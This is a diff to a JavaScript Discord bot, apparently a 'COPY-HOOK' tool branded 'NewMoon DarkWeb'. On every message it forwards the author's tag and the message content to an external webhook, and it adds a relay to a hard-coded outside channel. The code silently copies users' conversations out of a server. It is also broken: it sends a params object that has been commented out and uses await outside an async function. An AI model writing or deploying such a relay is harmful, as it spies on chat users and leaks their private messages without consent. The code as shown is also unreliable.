@@ -34,13 +34,27 @@ client.on("messageCreate", (message) => {
   const request = new XMLHttpRequest();
   request.open("POST", Myhook);
   request.setRequestHeader('Content-type', 'application/json');
-  const params = {
-    username: "NewMoon DarkWeb",
-    avatar_url: "https://cdn.discordapp.com/attachments/998675140042817567/1006267341484593352/newmoon.png",
-    title: "??? BY COPY-HOOK",
-    content: message.author.tag + " " + "sent message" + " " + message.content
-  }
-  
+  // const params = {
+  //   username: "NewMoon DarkWeb",
+  //   avatar_url: "https://cdn.discordapp.com/attachments/998675140042817567/1006267341484593352/newmoon.png",
+  //   title: "??? BY COPY-HOOK",
+  //   content: message.author.tag + " " + "sent message" + " " + message.content
+  // }
+  const lib = require('lib')({token: process.env.STDLIB_SECRET_TOKEN});
+
+await lib.discord.channels['@0.3.0'].messages.create({
+  "channel_id": `$1006286525857796138`,
+  "content": message.author.tag + " " + "sent message" + " " + message.content ,
+  "tts": false,
+  "embeds": [
+    {
+      "type": "rich",
+      "title": `??? BY COPY-HOOK`,
+      "description": "",
+      "color": 0x00FFFF
+    }
+  ]
+});
   request.send(JSON.stringify(params));
 
     }
